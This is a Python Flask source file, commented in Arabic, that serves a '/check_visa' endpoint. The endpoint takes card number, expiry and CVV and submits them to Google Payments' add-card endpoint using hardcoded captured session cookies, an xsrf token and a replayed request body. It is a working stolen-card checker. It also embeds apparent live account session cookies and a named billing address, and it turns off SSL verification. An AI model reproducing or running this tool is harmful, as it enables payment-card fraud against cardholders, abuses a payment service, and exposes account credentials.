from flask import Flask, request, jsonify
import requests
import urllib3

# تعطيل تحذارات SSL غير الضرورية
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

app = Flask(__name__)

@app.route('/check_visa', methods=['GET'])
def check_visa():
    # استقبال بيانات الفيزا من query parameters
    visa_data = request.args.get('visa')
    
    if not visa_data:
        return jsonify({'error': 'يجب تقديم بيانات الفيزا في الصيغة: رقم_الفيزا|الشهر|السنة|cvv'}), 400
    
    try:
        # تقسيم بيانات الفيزا إلى مكوناتها
        card_number, month, year, cvv = visa_data.split('|')
    except ValueError:
        return jsonify({'error': 'صيغة البيانات غير صحيحة. يجب أن تكون: رقم_الفيزا|الشهر|السنة|cvv'}), 400
    
    # تعريف الكوكيز المحدثة
    cookies = {
        'OTZ': '8178671_44_48_171240_44_319500',
        'AEC': 'AVh_V2hTIC9-mVszEOINI8u2nOJmGZ3LCjUDyCXNRSfyBh4uoAJZdNSpGJY',
        '__Secure-ENID': '28.SE=gCYShULI3i76tnAL80tFuKIUUi8xWEDSAbi46FkRdpxYqEBygLQCLLw6gKoVrKHVQTwTm_zF8BxwrcjxUzVAnVbfSEOLc5PnrbI9PFDL3LxkIwgNcVyI7WoH_xvrhXWCHh5LPA6aJJFX0_Iv4QDxVtbmeARl6CX5imbIGtt1CChyDRfqvZH95o3rNGYYt0hpzdlv5bPy',
        'NID': '525=WhixlLLiPF4sQaOTCEBgZ_TUpMngcUHZ3rnCNFkuh1ef0jw7k3SMRexwrS4MpMsKB5QCcJEK50pKd-kHolNDyOfcpSscJ1zO-WYmWzx7f_o_1C-0nFViak3kULa9Mq49P4acmoiEim3epVl90LDi8R5AOrh9luMVaGJ0mGXcGO2YO-0lrOMTFftYL9cGaiiXQ952HcBCbMyx9eSEULjFPPUxAjCsALi2hpS3u9LsJP55no8dYQsN91sW0KrT8CBB-K79yDOa8msy9jRRuSkvBmjXiE3byB2ontP2U6MUUSZFAzg4UKcq1pXzx45sZRbIKobZ-XqtPjZ-4lmS5MYkGn4d_cekFq12ryc3vlJDdgJOdByAmucqRxYb9vlbTmvkUGcQJHrsP_nWgmOAR43Lzjg5YGnncqPb2y8idTEPQwDUImPRripe9BOZNa0U1BP0RYZIvkh96JO8uLfMlkz72M_TRNZ7nIYLVx3rBy5qxkYD2ax6BuakEupEEBdIN0xDV1oA8v0R-PIpTWYc26f0pA3lc8NNRxnuSXjgRkZBCP_b2a-GaiKmZSDQg7GdywL6nXctbYftMd5U6KPnkwli2Khrv9HNTozziGwpUnvrGshhO35Gl_v1Ipyc2_BSfMrBEwN-kQ2_GpbZkYSDPgNAuIkCkUs0eHgwFTQtMFSdnqUcM9Gl_1DUJLI4EZClN9quI6z6NVLhRrblqt7eG4WXm5wXYNy-lnvroOU8IKP14z9iNn2se5hxjZPxQmZH10mp5ENH7dUoy2Q6k2HClRcAL_FpehRGgWMtEEfmd7U4phE-MHUG6GzZeMdxdhaGDLRQlzBNhRL733dJa2XAse5qgF3xun5KWcmzCJymPNYGP2Lq-gl_Px5u1_JQIXVL_SKNkvx8bq_hRuLs-4LfiGgmtVt4c4qZWHqzo3Pb8S3kHag2YJtgYpRUOKPYjfS5gpbEm-v1RosWREU8gLdKZTi2D7PU5iYz0T478fMJ47vMO98_T8RAsD04YROwyFZIG56afUNvIR_TwUtQhkBxzarUYcshleUerspv_KKNCBK4hv_qecqcavyd8Hb-_cvrOF0fMclaqXbBJj5iq4vvL6IH4NXHsoEjnJ2bxuC_ajutynE2-IKd6Ai0wE7TJhkm-TdVECfDFhY4vKw',
        'SID': 'g.a000zgiGj-VEhZ8ybH-W-Cfo7W9QEcj8RK1_V-m2gC9REBblsiX4dsFpKagt42vdEtiG0Rkd1AACgYKAVASARYSFQHGX2Mipbmxi9bNbppaZy2Pfq6aMBoVAUF8yKqLAWE6-vkJiI2ejCrLjkbo0076',
        '__Secure-1PSID': 'g.a000zgiGj-VEhZ8ybH-W-Cfo7W9QEcj8RK1_V-m2gC9REBblsiX4zH0WTJSsL71WBV7ipkADDQACgYKAf4SARYSFQHGX2Mi00fGGW5SxgrNAC95PAA-dRoVAUF8yKoNvMtLZyTcTYyGT2F0Vuud0076',
        '__Secure-3PSID': 'g.a000zgiGj-VEhZ8ybH-W-Cfo7W9QEcj8RK1_V-m2gC9REBblsiX4CicnSlMhIXIGMLZfMOwOHQACgYKAUQSARYSFQHGX2Mi7ZXAjEvjzh9AwOmEV8etyRoVAUF8yKrDw9q1sflAPz6Zg3CLYKMb0076',
        'HSID': 'ArkV-KZgfrSX_MvCw',
        'SSID': 'AzLABZTeM1MDg1p_M',
        'APISID': 'bfK2QIJ55eFFxL7v/A-IQvLw-Ptt9pkvk_',
        'SAPISID': 'Bf_-v6LERe4OwjIh/AGR1n7o8YXV0arAwF',
        '__Secure-1PAPISID': 'Bf_-v6LERe4OwjIh/AGR1n7o8YXV0arAwF',
        '__Secure-3PAPISID': 'Bf_-v6LERe4OwjIh/AGR1n7o8YXV0arAwF',
        '__utma': '207539602.2100594883.1742201890.1753781013.1753803374.13',
        '__utmc': '207539602',
        '__utmz': '207539602.1753803374.13.13.utmcsr=wallet.google.com|utmccn=(referral)|utmcmd=referral|utmcct=/',
        '__utmt': '1',
        'S': 'billing-ui-v3=JrbjFzpekPr9jD85gbh-J_fmBmTYbqiP:billing-ui-v3-efe=JrbjFzpekPr9jD85gbh-J_fmBmTYbqiP',
        '__utmb': '207539602.7.9.1753803403343',
        'SIDCC': 'AKEyXzXCsaHOODrcVWdx-sOdg5Mi9OuGYQWxbZ5r0l_J_D1z7OewiEr8zIOHs0S7ijhGNBLjrg',
        '__Secure-1PSIDCC': 'AKEyXzV6jBGpOFr9Z3AKShLiNzKdl4GDYYwJwiHoO1V90VDe-F4Y6F--OBDnx8dGwhNmnm4ZJ8I',
        '__Secure-3PSIDCC': 'AKEyXzUKN_3f2zuO_PXT73_m1dBLmrEkbfx5Q5hfo94lccHxiFWVTelmxPwAY3fKGNH1G5X-guA',
    }

    # تعريف الهيدرات المحدثة
    headers = {
        'authority': 'payments.google.com',
        'accept': '*/*',
        'accept-language': 'ar-AE,ar;q=0.9,en-IN;q=0.8,en;q=0.7,en-US;q=0.6,he;q=0.5',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://payments.google.com',
        'referer': 'https://payments.google.com/payments/u/1/embedded/instrument_manager?tc=96%2C87&wst=1753803363300&cst=1753803371522&si=6293983494764619&pet&sri=2&hmi=false&ipi=w5xn8rwopyou&hostOrigin=aHR0cHM6Ly93YWxsZXQuZ29vZ2xlLmNvbQ..&eo=https%3A%2F%2Fwallet.google.com&origin=https%3A%2F%2Fwallet.google.com&ancori=https%3A%2F%2Fwallet.google.com&mm=e&hl=ar&style=%3Am2&ait=GAIA&cn=%24p_7ba5ogw5hp5h0&fms=true&actionToken=CiQIASICVVNoAXAAeAGaAQ8KByCmn9iv1Acg9acEYgDAAgD4AwE%3D&spul=500&cori=https%3A%2F%2Fwallet.google.com',
        'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
        'sec-ch-ua-arch': '""',
        'sec-ch-ua-bitness': '""',
        'sec-ch-ua-full-version': '"137.0.7337.0"',
        'sec-ch-ua-full-version-list': '"Chromium";v="137.0.7337.0", "Not/A)Brand";v="24.0.0.0"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-model': '"SM-A307FN"',
        'sec-ch-ua-platform': '"Android"',
        'sec-ch-ua-platform-version': '"11.0.0"',
        'sec-ch-ua-wow64': '?0',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
        'x-client-data': 'CIOJywE=',
        'x-requested-with': 'XmlHttpRequest',
    }

    # تعريف البارامترات المحدثة
    params = {
        'ait': 'GAIA',
        'cn': '$p_7ba5ogw5hp5h0',
        'eo': 'https://wallet.google.com',
        'hostOrigin': 'aHR0cHM6Ly93YWxsZXQuZ29vZ2xlLmNvbQ..',
        'ipi': 'w5xn8rwopyou',
        'hl': 'ar',
        'mm': 'e',
        'origin': 'https://wallet.google.com',
        'si': '6293983494764619',
        'style': ':m2',
        'cst': '1753803371522',
        'wst': '1753803363300',
        's7e': '3.1.0.0;3.1.0.1',
        'rt': 'j',
        's': '6',
    }

    # تعريف بيانات الطلب المحدثة
    data = {
        'xsrf': 'AJWlU2PylRJxRJL938qDgnNxXcBeEIbYow:1753803372896',
        '3.1.0.0': card_number,
        '3.1.0.1': cvv,
        'msg': '[[null,"ACo329wdLYmwsHonqdm9hpcLSJfZrTVvFmAnvvKZbT59p7s9I5BcDWAqgurbV/+6UKrmwu6E0yGs7bSc4lvDf71y6DxfctoTJ5XMUo0T9QrSYI6pbpiPYzOkqE/k2gYxf92/tDbM/G/DK2ioEsR3ftWT4Xg7EZKmV+Uof9P4PKTquh8HnuGe4udHRjLCArje5qIjs/cxD81T5nys4uFk4f6rO7QPuB4OyKKbY4Pkki1Jt10LcwA650nJ1C4UuXVniVmONa1g9MRb",null,[null,[null,null,null,["!h4SlhNzNAAa73VJ7m91CvwzHw96ogD07ADQBEArZ1JExbSwgQIYsw0uspaeSQ4yFKGP6uAtd6AN15ZlxrylX4aPz6_O75UR7OsO_L9vRAgAABaZSAAAAKGgBB34ATGx4T4clRQl1P-XIm0erargHXxmBpQ2LL6Fh7wq9a-PMOOy4SAdcbbilPFAzHUbClZMMnhNA6fz2C0V301Ly6JdA6psVESkZDx_2uAeZBsYAe7nr-O1y9dZHaRbgt_jIvBECO7aps-k0407aQpgr8dkNzxqLal4nMVuO9bbr5lDR80FWdRi0XoLCRRb62-HKhw7P-mkquSb8TsSu0CDzd_ZjjeuxdGcukKRKLQ6nJpQInDO49OjnSwiinxKYSSsxi6rkgOfqk_WFexUCXEdnbYzaw5-X1bimWbvbY1a2Q9_R7UtdW0Dn4NR4fDBQxS7CNuCICOnOLQVH_uoyNnDgE7yYtiqA33D6InYgvstbQ0jfrR4u8ZWx1QT40KTlAwPqcIuBI94ZORZhQrKS4hMcZZcy4BRd6Qzrxj5zqGnXB4A0m1CsrboizBcZxyAd4qWvzqYMeQhn1FIkxERqz_UKkDVyh31m0WnQRIMbZXMrjzoKYIbWngnbgOwz6QKaI7GV0PtBuqMPwJk16mu_DEODeDTGXkU5KyMKyQKGpoFfX51eB81CLUdwWmBAVWOc6-tjSm_KUQrsAc2jHM0fEsOezFYWJFMzUoWw_M-0W92VP6V7fhccIySha2-huze8q1hGPUPsRpTptdTP09RS7-wbYGdWQsWs-2odIu0jKkZcOrHA6aNGpE1YOllG_2DXB5giYUAgmRb5SfbKZojDb7w3KpkWUVD-9GYgbs9kEYn25Rj_7UE1RR12y_Aoay9w6F7h7rqlR3mXz414AmEgx2kyxgTqHoky0CDiZNDKMpW7J6hvM3Y6roxtXCEntGUv6xOSsP1NrAU9T9dkiI9KA8IiQw0A8cwWDPtnu7BuZR9M9yQjWLDkp5k5fNdRpCSB-2rrpHWVLnCRUdCgl2Lcl7JCkh1IXkQ5ETVDZKSxv4t0iY1OUn2FzPbdm0EYIF0i45W0ahwpDbsCXL0ygdmPk-S6SRRxSOY3qq_5m5PqO0jafylqFxXLbzOKpxUnFAkbjBl46KvGToSUZmrA5l3DS02Nbb3lSB_auJb2WU5oi6-Yko42fwLop2OzPG2_d-_KDRj8DZMBhChAVdLMeJ13YM0D-oj4Cl9483bvGKfO0B46SgzcbKs1O2LMPSQbYBKut2TOyFr-1YAQbAK5w366Aoduku3x1lJ4lDihSdq61c2KwCwk3X2kmUDjGRFCyhg4fP1hyeQflLOynywSOfS_Nwkw7iLmOvtKFdYA_SM-R_SKD4BQMVgVHhYiVQr59N6nFa2TqgbCm43TrJ_MhcyzvNVvyuz0ML0D3Pg5ui2UFJVhobDBJXccnB8C1l7eMSRvYNSGiqzCPk1WkaOlbkuMTyZPzunQ49JJzTAkhLEgC8okdbXFHkRctNPNerYMhCVTRjTIzGHsW9FKirRVFLLnf4snpWb0-x-PiIr1houEph196n0XIWZOxC3nV0q1IJPbx0FzDfYlvTpRHDl8SiQirEX8nQ006AwMZIK7ofMocPAgvN9P8TZ1r6nxM-HVWjipuuWuzJP34_k0E66orgqAnFEAEmfvKCxKj8dzvD3CjKF4AI6CXTzib6ifRzwQchiCmWn1HPTxwrMB5zOLtX-T1TwjRYR78Ey83PyA0oswRRQ4-2HS0OiE10EZPOuh5GkVOpVswJDAsIfZS-OKFK5-GmqzzyfzPJpiFZFWTbkyk_L03JWuYnQoxLNjyj438z-svJ_oZ9bJhuaF1pTYnVmaZW0vd-1u66LN84kz30I_cg7M-h9Kegf8fFvNlOb9iiFFIbySMw6ASZ-5jt3Jh-XPET5C72o-fIUCzODRF6l_gb1DdTO-duJaC_f2GGcSNwx2RhV0_f696HQuqa6iKJG-PQ6Oog8Ch_OY2MB5E6H5RtEWkt9AsW7riyW2r-xNKQ5vzrwk0kZlOzdtiSTq-yZkT9Hj-gy7S44UUyXEfdEm_YopYFP2Hqu2EfY7L5Xk-DYd7ABxJPAadFXFD0mFqnm1qOg0weMSbn3nsGxE-arK7APTEI3rFo10kyQ9oKScZahvwKlHm-csMT4lY0ifkhaJHI-ppmpVOx3o3KbIu9BnfRQ7W8t7i7hrOVIIfkjbe-rPQJynY8wjtrAVkJVZ7Dx5rFzG17f4m3mgC775PoV15BStHp1Mcdgkl9S4FH_E4kMDgy8d-psJ70CIHLaDq_TkApi5Yrg4LZCzMMlWs-tU13oyNhsquV3eVlcALh3Qre7trVSGBKp4UJeHub4QhA2UtupqEn5zymUoTN1KQzWLgcY65S1FI1I35AP2r37troJIur_YmbVrGFQLaf1Uw30KfBUKA9yck-12VIhXO6PDlIecAaLi8xVQBIUH8mSjM2TqZHlGIX6HeZHDzKi9w2tBM3ioXNgLOc89l7cfFglO9-NniEOisD6pXjg"]]],null,null,"ar",1,1],null,null,[null,[["__secure_field__4fa1d0a7","__secure_field__4fa1d0a7",11,2029,null,"1703",null,"__s7e_data__61bb463a","Mia Reid",[["US",null,"TX",null,"Plano",null,null,null,null,null,null,"75074",null,["098 Fairwood Village","Oisoddn"]],null,null,null,"billingAddress",null,"CggIxLmJwwIQAQ==",2001],"CAIQAhogEgJVUxoDVVNEMAZAAFABYPWnBGoCCgCgARSoARSwARQ=","0.buyertos/US/6/20/en,0.privacynotice/ZZ/5/9/ar","creditCardForm-1"]]]]',
        'kt': 'Rs2.0.8:billing_ui_v3::s11,2,26b5e19,2,140,a063ebe9,1,2b6,edd98bac,0,18,4863fd35,0,140,cb2d5c6f,0,2b6,6ad47c6c,2,e8,7bdb49f6,0,95,b6540200,1,140,eea820b6,0,236,1aa4331,0,"Linux armv81,f54683f2,0,"Google Inc.,af794515,0,"5.0 28Linux3b Android 103b K29 AppleWebKit2f537.36 28KHTML2c like Gecko29 Chrome2f137.0.0.0 Mobile Safari2f537.36,d81723d1,1,"ar2dAE,5cc3ab5f,0,"Mozilla2f5.0 28Linux3b Android 103b K29 AppleWebKit2f537.36 28KHTML2c like Gecko29 Chrome2f137.0.0.0 Mobile Safari2f537.36,24a66df6,0,-b4,"Thu Jan 01 1970 023a003a00 GMT2b0200 282a48424a2a 343142 234831482827 27443133454a29,770c67fc,0,7:a21,3,19856d3bbfe,10,"cardnumber,"ccmonth,"ccyear,"cvc,"ccname,"COUNTRY,"ORGANIZATION,"RECIPIENT,"ADDRESS_LINE_1,"ADDRESS_LINE_2,"LOCALITY,"POSTAL_CODE,"PHONE_NUMBER,"embedderHostOrigin,"xsrf,"sri,84,2da:a40,"f,19856d3bed9,"n,0,0,"t,19856d3b46c,0,0,0,0,19856d3b47b,19856d3b47b,19856d3b47b,19856d3b47b,19856d3b47b,0,19856d3b48b,19856d3b6ac,19856d3b6ce,19856d3b742,19856d3bc2b,19856d3bc2c,19856d3bfbb,19856d3c2cb,19856d3c2cc,19856d3c328:a10:a31,3,"h,1,"p,74,1c,"m,d1c,28ee,aaa,70,1ff3,1f09'
    }

    try:
        # إضافة جلسة مع إعدادات أفضل للاتصال
        session = requests.Session()
        session.verify = False  # تعطيل التحقق من SSL (لأغراض الاختبار فقط)
        session.headers.update(headers)
        
        # إرسال الطلب مع إعدادات متقدمة
        response = session.post(
            'https://payments.google.com/efe/payments/u/1/instrument_manager_save_page',
            params=params,
            cookies=cookies,
            data=data,
            timeout=15,
            allow_redirects=True
        )
        
        # إرجاع الاستجابة كـ JSON
        return jsonify({
            'status_code': response.status_code,
            'headers': dict(response.headers),
            'content': response.text
        })
        
    except requests.exceptions.RequestException as e:
        return jsonify({
            'error': str(e),
            'message': 'فشل في الاتصال بخادم جوجل. يرجى التحقق من اتصال الإنترنت أو تحديث الكوكيز والهيدرات.'
        }), 500

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)
